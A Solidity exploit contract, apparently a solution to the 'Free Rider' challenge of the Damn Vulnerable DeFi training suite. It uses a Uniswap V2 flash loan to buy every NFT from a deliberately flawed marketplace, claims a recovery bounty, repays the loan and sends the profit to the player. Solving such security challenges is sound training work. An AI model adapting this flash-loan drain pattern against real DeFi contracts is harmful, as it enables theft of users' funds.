// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {console} from "forge-std/Test.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract Attacker is IUniswapV2Callee, IERC721Receiver {
    WETH immutable weth;
    IUniswapV2Pair immutable uniswapPair; // WETH is token0 for the pair in this challenge
    FreeRiderNFTMarketplace immutable marketplace;
    DamnValuableNFT immutable nft;
    FreeRiderRecoveryManager immutable recoveryManager;
    address immutable player; // The player who deploys and initiates the attack

    uint256 constant AMOUNT_OF_NFTS = 6; // As defined in FreeRider.t.sol
    // LOAN_AMOUNT_WETH is the amount we request. `amount0` in uniswapV2Call will be this value.
    uint256 constant LOAN_AMOUNT_WETH = 15 ether; 

    constructor(
        WETH _weth,
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        FreeRiderRecoveryManager _recoveryManager
    ) {
        weth = _weth;
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;
        player = msg.sender; // Player deploys this contract
    }

    function attack() external {
        // WETH is token0. We borrow LOAN_AMOUNT_WETH of WETH.
        // amount0Out = WETH to receive, amount1Out = DVT to receive (0 here).
        // Pass player address in data to be used in the callback.
        bytes memory data = abi.encode(player);
        uniswapPair.swap(LOAN_AMOUNT_WETH, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint amount0, uint /* amount1 */, bytes calldata data) external override {
        require(msg.sender == address(uniswapPair), "uniswapV2Call: Caller must be Uniswap pair");
        // 'sender' is the address that initiated the swap call on the pair. In our case, this contract.
        require(sender == address(this), "uniswapV2Call: Flash loan not initiated by this contract");

        address _player = abi.decode(data, (address)); // Recover player address

        // amount0 is the WETH received from the flash loan, should be equal to LOAN_AMOUNT_WETH.
        // amount1 (DVT received) should be 0, hence commented out.

        // Step 1: Convert received WETH (amount0) to ETH
        console.log("Attacker: Received %s WETH from flash loan.", amount0);
        weth.withdraw(amount0); // Use the actual received amount
        console.log("Attacker: Converted WETH to ETH. Current ETH balance: %s", address(this).balance);

        // Step 2: Buy all NFTs from the marketplace
        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            tokenIds[i] = i;
        }

        // The marketplace.buyMany requires 15 ETH, which is LOAN_AMOUNT_WETH.
        // address(this).balance should be `amount0` (i.e., LOAN_AMOUNT_WETH) at this point.
        console.log("Attacker: Calling marketplace.buyMany with %s ETH value.", amount0);
        marketplace.buyMany{value: amount0}(tokenIds); // Use amount0 (which is 15 ETH) as value
        console.log("Attacker: ETH balance after marketplace.buyMany: %s", address(this).balance);

        // Log NFT ownership - attacker contract should own them now
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            console.log("Attacker: Owner of NFT ID %s is %s", i, nft.ownerOf(tokenIds[i]));
            require(nft.ownerOf(tokenIds[i]) == address(this), "Attacker should own the NFT after buying");
        }

        // Step 3: Transfer NFTs to RecoveryManager. This will trigger bounty payment to the player.
        console.log("Attacker: Transferring NFTs to RecoveryManager for player %s to receive bounty.", _player);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), tokenIds[i], abi.encode(_player));
        }
        console.log("Attacker: NFTs transferred to RecoveryManager.");

        // Step 4: Repay the flash loan (amount0 + 0.3% fee)
        uint256 wethToRepay = (amount0 * 1000 / 997) + 1; // Calculate fee based on actual borrowed WETH (amount0)
        console.log("Attacker: Calculated WETH to repay (including fee): %s", wethToRepay);

        console.log("Attacker: Depositing %s ETH to WETH for repayment.", wethToRepay);
        weth.deposit{value: wethToRepay}();
        console.log("Attacker: Transferring %s WETH back to Uniswap pair.", wethToRepay);
        weth.transfer(address(uniswapPair), wethToRepay);
        console.log("Attacker: Flash loan repaid.");

        // Step 5: Transfer remaining ETH from this contract to the player
        uint256 remainingBalance = address(this).balance;
        console.log("Attacker: Transferring remaining %s ETH to player %s.", remainingBalance, _player);
        if (remainingBalance > 0) {
            payable(_player).transfer(remainingBalance);
        }
        console.log("Attacker: Attack complete. Final ETH balance of attacker: %s", address(this).balance);
    }

    // Implementation of IERC721Receiver.onERC721Received
    // This function is called by DamnValuableNFT.safeTransferFrom when this contract is the recipient.
    function onERC721Received(
        address, /* operator */
        address, /* from */
        uint256, /* tokenId */
        bytes memory /* data */
    ) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // Fallback function to receive ETH if necessary
    receive() external payable {}
} 